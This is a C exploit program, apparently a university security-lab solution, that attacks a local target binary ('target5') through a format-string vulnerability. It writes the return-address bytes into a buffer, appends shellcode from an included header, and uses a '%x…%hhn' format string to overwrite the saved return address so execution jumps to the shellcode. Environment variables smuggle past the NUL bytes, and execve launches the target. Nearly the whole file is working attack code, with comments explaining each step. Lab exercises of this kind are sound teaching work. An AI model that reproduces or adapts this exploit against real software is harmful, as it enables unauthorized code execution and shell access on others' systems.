#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

const int padding = 60;
const int fString = 256;

int main(void)
{
	char *args[3];
	char *env[17];

	char filler [fString];
	int i;

	// We are not going to be pointing at buf when we use our %s's but rather format string
	// this will allow us to overwrite the return address byte by byte but also point back to buf
	//which will begin with shellcode which starts 60 bytes in (memcpy in target)
	
	// write in RA
	filler[0] = '\x68';
	filler[1] = '\xfe';
	filler[2] = '\x42';
	filler[3] = '\x40';
	filler[4] = '\x00';
	filler[5] = '\x00';
	filler[6] = '\x00';
	filler[7] = '\x00';

	// 4 bytes of junk
	for (i = 8; i < 16; i++) {
		filler[i] = '\x90';
	}

	// RA + 1
	filler[16] = '\x69';
	filler[17] = '\xfe';
	filler[18] = '\x42';
	filler[19] = '\x40';
	filler[20] = '\x00';
	filler[21] = '\x00';
	filler[22] = '\x00';
	filler[23] = '\x00';

	// 4 bytes of junk
	for (i = 24; i < 32; i++) {
		filler[i] = '\x90';
	}

	// RA + 2
	filler[32] = '\x6a';
	filler[33] = '\xfe';
	filler[34] = '\x42';
	filler[35] = '\x40';
	filler[36] = '\x00';
	filler[37] = '\x00';
	filler[38] = '\x00';
	filler[39] = '\x00';


	// 4 bytes of junk
	for (i = 40; i < 48; i++) {
		filler[i] = '\x90';
	}

	// RA + 3
	filler[48] = '\x6b';
	filler[49] = '\xfe';
	filler[50] = '\x42';
	filler[51] = '\x40';
	filler[52] = '\x00';
	filler[53] = '\x00';
	filler[54] = '\x00';
	filler[55] = '\x00';

	// 4 bytes of junk gets us to a total of 60 bytes which will not be copied to buf
	//and only exist in formatString
	for (i = 56; i < 60; i++) {
		filler[i] = '\x90';
	}

	//copy in the shellcode
	int shell_len = strlen(shellcode);

	memcpy(filler + padding, shellcode, shell_len);
	
	// 5 * %x gets the argument ptr at beginning of formatString, where we begin writing in the address of buf
	// into the return address of foo, we bign by printing 60, then math tells us how many more bytes we need
	//in order to fully print out 0x4042fe60 which is the address of buf
	char *fill = "%8x%8x%8x%8x%19x%hhn%154x%hhn%72x%hhn%254x%hhn";
	

	// add in all the info into exploit
	int fill_len = strlen(fill);

	memcpy(filler + padding + shell_len, fill, fill_len);

	int len = padding + shell_len + fill_len;

	//fill in the rest of filler with NOP's, this prevents a seg fault from happening
	for (i = len; i < fString; i++) {
		filler[i] = '\x90';
	}

	args[0] = TARGET; 

	//we set args[1] to filler; however it contains 0x00's (NULLS) which we need for 64 bit memory addresses.
	// This means it wont be copied over when we run the code which means we will have to use env in order to 
	//pass the rest of the exploit into the target (the memcpy skips the NULLs as they are in the first 60 bytes so
	//the env variables will be copied into the formatString variable without issue)
	args[1] = filler; 
	args[2] = NULL;
	
	// the env 0,1,2 all contain the nulls left behind in the pass over (only one was taken)
	env[0] = &filler[5];
	env[1] = &filler[6];
	env[2] = &filler[7];
	
	// between filler[8] and [21] there is a Null only at the end and so everything is captured  
	env[3] = &filler[8];

	// we repeat the same principle as with the prior env variables above with those below
	env[4] = &filler[21];
	env[5] = &filler[22];
	env[6] = &filler[23];
	env[7] = &filler[24];
	env[8] = &filler[37];
	env[9] = &filler[38];
	env[10] = &filler[39];
	env[11] = &filler[40];
	env[12] = &filler[53];
	env[13] = &filler[54];
	env[14] = &filler[55];
	env[15] = &filler[56];
	env[16] = NULL;

	if (0 > execve(TARGET, args, env))
	fprintf(stderr, "execve failed.\n");

	return 0;
}


